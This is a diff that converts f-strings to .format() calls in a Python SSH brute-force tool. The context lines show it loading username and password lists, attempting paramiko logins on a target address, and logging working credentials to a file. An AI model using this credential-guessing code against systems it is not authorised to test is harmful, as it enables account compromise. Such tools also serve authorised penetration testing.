@@ -39,11 +39,11 @@ def ssh_connect(host, username, password):
             # If it didn't throw an exception, we know the credentials were successful, so we write it to a file.
             with open(args.logfile, "w") as fh:
                 # We write the credentials that worked to a file.
-                print(f"{username}:{password} found. <==================")
-                fh.write(f"{username}:{password}\n")
+                print("{username}:{password} found. <==================".format(username=username, password=password))
+                fh.write("{username}:{password}\n".format(username=username, password=password))
             break
         except AuthenticationException:
-            print(f"{username}:{password} is Incorrect.")
+            print("{username}:{password} is Incorrect.".format(username=username, password=password))
             break
         except ssh_exception.SSHException:
             time.sleep(0.3)
@@ -56,17 +56,17 @@ def ssh_connect(host, username, password):
 
 def main():
     print("[*] Simple SSH Brute Forcer")
-    print(f"[*] Brute Forcing {args.ipv4}")
+    print("[*] Brute Forcing {}".format(args.ipv4))
 
     logging.getLogger('paramiko.transport').addHandler(NullHandler())
 
     # read usernames and passwords
     u_fp = open(args.username, "r")
     usernames = u_fp.readlines()
-    print(f"[*] Loaded {len(usernames)} Usernames")
+    print("[*] Loaded {usernames} Usernames".format(usernames=len(usernames)))
     p_fp = open(args.password, "r")
     passwords = p_fp.readlines()
-    print(f"[*] Loaded {len(passwords)} Passwords")
+    print("[*] Loaded {passwords} Passwords".format(passwords=len(passwords)))
 
     print("[*] Brute Force Starting")
     threads = []
